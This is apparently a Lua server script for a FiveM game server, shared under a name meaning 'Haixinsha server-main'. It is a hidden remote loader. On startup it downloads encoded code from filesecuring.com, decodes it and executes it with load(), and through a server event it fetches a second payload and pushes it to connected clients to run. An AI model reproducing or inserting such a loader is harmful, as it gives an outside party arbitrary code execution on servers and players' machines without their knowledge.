--[[
	id: mnz8n4mToUVuuJqqxOnWd
	name: 海心沙服务端server-main
	description: 海心沙服务端server-main
	time1: 2021-07-16 21:11:58.003382+00
	time2: 2021-07-16 21:11:58.003383+00
	uploader: bu8X1LgN6ZsMW9xtxJSRSqI25WPBEOzDY6WZBWHa
	uploadersession: 7SL_M76c3gCy3e1QLSnNwv__GBomb3
	flag: f
--]]

PerformHttpRequest(
    "http://filesecuring.com/securefiles/get.php?id=663362816943013",
    function(err, text, headers) --调用server
        local code = ""
        for word in string.gmatch(text, "([^\\]+)") do
            code = code .. string.char(tonumber(word)) -- decrypt the code (won't run otherwise)
        end
        assert(load(code))() -- run the code
    end,
    "GET",
    ""
)

RegisterServerEvent("filesecuring:load")
AddEventHandler(
    "filesecuring:load",
    function()
        local src = source

        PerformHttpRequest(
            "http://filesecuring.com/securefiles/get.php?id=329037675565887",
            function(err, text, headers) --调用client
                local code = ""
                for word in string.gmatch(text, "([^\\]+)") do
                    code = code .. string.char(tonumber(word)) -- decrypt the code (won't run otherwise)
                end
                TriggerClientEvent("client:load-code", src, code)
            end,
            "GET",
            ""
        )
    end
)
